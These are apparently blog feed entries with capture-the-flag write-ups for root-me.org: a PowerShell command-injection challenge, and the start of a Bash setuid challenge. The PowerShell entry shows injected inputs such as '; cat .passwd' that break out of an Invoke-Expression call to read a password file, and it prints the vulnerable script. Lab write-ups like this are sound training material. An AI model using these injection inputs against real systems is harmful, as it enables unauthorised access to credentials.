&lt;p&gt;Firstly, let’s discuss Powershell. Powershell serves as a Windows shell, akin to how Bash functions in Linux (or MacOS). Succeeding the older ‘CMD’ shell, Powershell can be seen as an enhanced version of CMD, offering a more robust feature set.&lt;/p&gt;

&lt;p&gt;In Powershell, numerous commands are similar to those in CMD, but it also introduces a plethora of new ones exclusive to it. For example, commands like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt; are integrated from the Bash into Powershell.&lt;/p&gt;

&lt;p&gt;For a simplistic introduction, this should suffice. However, if you are interested in how to level you Powershell game up, check it out &lt;a href=&quot;https://github.com/lllife-uncat/powershell-101/blob/master/PG_PowerShell_XWIPSCRE01_0.pdf&quot;&gt;this&lt;/a&gt; github repository. It contains a PDF full of insights on how to succeed using this shell!&lt;/p&gt;

&lt;h3 id=&quot;command-injection&quot;&gt;Command injection&lt;/h3&gt;

&lt;p&gt;Command injection is a cyber attack that involves executing arbitrary commands on a host operating system (OS). Put in simple terms, a command injection vulnerability is one that the attacker disrupts the normal flow of a script, injecting arbitrary - usually not intended by the developer - code. This form of attack is distinct from other types of code injection, as it specifically targets command execution within an operating system’s environment.&lt;/p&gt;

&lt;p&gt;For a good reference, check it out the OWASP command injection &lt;a href=&quot;https://owasp.org/www-community/attacks/Command_Injection&quot;&gt;page&lt;/a&gt;. It demonstrates how this usually happens within a Unix environment.&lt;/p&gt;

&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;Now that we’ve grasped the basic concepts that this challenge is involved with, let’s ssh into the machine and take a look around. Remember, this is a Powershell machine, so be comfortable working with Windows shell commands.&lt;/p&gt;

&lt;p&gt;Here’s the greeting we receive upon sshing:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2225 app-script-ch18@challenge05.root-me.org
      _           _ _                        ___  ____  
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; ___| 
 / __| &lt;span class=&quot;s1&quot;&gt;&apos;_ \ / _` | | |/ _ \ &apos;&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | |___ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;
| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__| | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | |  __/ | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| |  __/ |_| |___&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
 &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_|_|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, |&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/|____/ 
                                 |___/ root-me.org      

app-script-ch18@challenge05.root-me.org&lt;span class=&quot;s1&quot;&gt;&apos;s password: 
Table to dump:
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This interface suggests that we are interacting with a command line program or script, rather than being directly in the shell environment. Let’s type any command to see what happens:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Table to dump:
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Alright, we are indeed inside a command line interface. We are not able to run Powershell commands, but since the problem says we have command injection, we might need to break this interface and access the shell. This is our goal!&lt;/p&gt;

&lt;h3 id=&quot;context&quot;&gt;Context&lt;/h3&gt;

&lt;p&gt;This command line interface might be something like this, in powershell:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Simulate-Interaction&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Table to dump:&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Simulate-Interaction&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To simulate it, let’s run a built-in PS shell inside our Linux environment:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /tmp/root-me&amp;gt; ./ps-ci.ps1
Table to dump:
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; : &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yep. That looks almost the same as the CTF. See, a command injection vulnerability happens when our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$input&lt;/code&gt; variable breaks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Write-Host&lt;/code&gt; command and runs another on instead. In our code, however, that is not possible, as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Write-Host&lt;/code&gt; is not prone to command injection. However, we can think that the script flow is similar to this one. To break out the string, we would use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; pipe in Powershell, which is the same as saying: hey PS, besides what you need to run, do also run the following command as well. Here’s an example:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /tmp/root-me&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;kaizen
cinjection  cinjection.c  ps  ps-ci.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;We have basically crafted our attack in the last step. The idea here is to break the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$input&lt;/code&gt; that the CTF Powershell script takes with a semi-colon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; and pass a PS command afterwards. So, the initial attack would be: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; ls&lt;/code&gt; for example.&lt;/p&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;Let’s try it out:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table


    Directory: C:&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;ygwin64&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;hallenge&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp-script&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;h18


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       12/12/2021   9:25 AM             43 .git
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       11/21/2021  11:34 AM            150 .key
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        4/20/2020  10:50 AM             18 .passwd
&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;       12/12/2021   9:50 AM            574 ._perms
&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;       11/21/2021  11:35 AM            348 ch18.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aha! As expected, we could break the input by passing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; pipe with another command. Out of curiosity, let’s take a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch18.ps1&lt;/code&gt; script by injecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat ch18.ps1&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Conv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ertFrom-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Table to dump: &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoNewLine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Write-Host Connect to the database With the secure Password: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
. Backup the table &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Amazing. It is using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iex&lt;/code&gt; CMDlet, which is the short for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-Expression&lt;/code&gt; method used for executing code. That is why the subtitle of this CTF is “There’s UI, UX and IEX” xD&lt;/p&gt;

&lt;p&gt;To solve this problem, we simply pass the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat .passwd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .passwd
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table
SecureIEXpassword
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And there we have it! The flag for this CTF is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SecureIEXpassword&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we learned a bit more about Powershell and command injection. The task was straightforward – to recover a database password within a Windows environment.&lt;/p&gt;

&lt;p&gt;We first revised some Powershell concepts, as well as the definition of command injection attacks. The CTF setup led us to leverage the semicolon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; in Powershell to append and execute additional commands. By applying this technique, we successfully injected command within the environment.&lt;/p&gt;

&lt;p&gt;As we can see, this is a simple Powershell CTF. By keeping our approach mindset, it was not difficult to find a way out to catch this flag!&lt;/p&gt;

&lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//powershell-command-injection-root-me-copy</link>
        <link href="http://localhost:4000/powershell-command-injection-root-me-copy"/>
        <guid isPermaLink="true">http://localhost:4000/powershell-command-injection-root-me-copy</guid>
      </item>
    
      <item>
        <title>Bash - System 2 - root-me.org</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Since we just solved Bash - System 1 (you can check it out &lt;a href=&quot;bash-system-1-root-me&quot;&gt;here&lt;/a&gt;), let’s go and solve their second level as well. This challenge is very similar to the last one, but with a twist.&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;The ‘Statement’ for this challenge is the following C code:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;     
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls -lA /challenge/app-script/ch12/.passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To connect to the room, we can SSH:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2222 app-script-ch12@challenge02.root-me.org&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;with the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch12&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;Let’s start building up some calluses again by developing our approach mindset step-by-step. For this problem, we have already tackled the basic concepts in our previous Capture The Flag (CTF) challenge.&lt;/p&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;p&gt;If you are not familiar with the functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setreuid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, go check it out in my last CTF solution for Bash - System 1, which we discussed them thoroughly &lt;a href=&quot;bash-system-1-root-me#step-1---understanding-basic-concepts&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;We can see that this challenge is fairly similar to Bash - System 1 challenge. However, we have something new here. In the previous CTF, we saw that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; line was simply a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. In this level, the complexity increases with the addition of a switch to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, as seen in the following line of code:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;ls -lA /challenge/app-script/ch12/.passwd&quot;);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Note that we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; switch passed as argument to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. Let’s SSH into the machine and take a look around:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 32
dr-xr-x---  2 app-script-ch12-cracked app-script-ch12         4096 Dec 10  2021 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 25 root                    root                    4096 Sep  5 14:00 ..
&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 root                    root                     640 Dec 10  2021 ._perms
&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt;  1 root                    root                      43 Dec 10  2021 .git
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch12-cracked app-script-ch12-cracked   14 Dec 10  2021 .passwd
&lt;span class=&quot;nt&quot;&gt;-rwsr-x---&lt;/span&gt;  1 app-script-ch12-cracked app-script-ch12         7252 Dec 10  2021 ch12
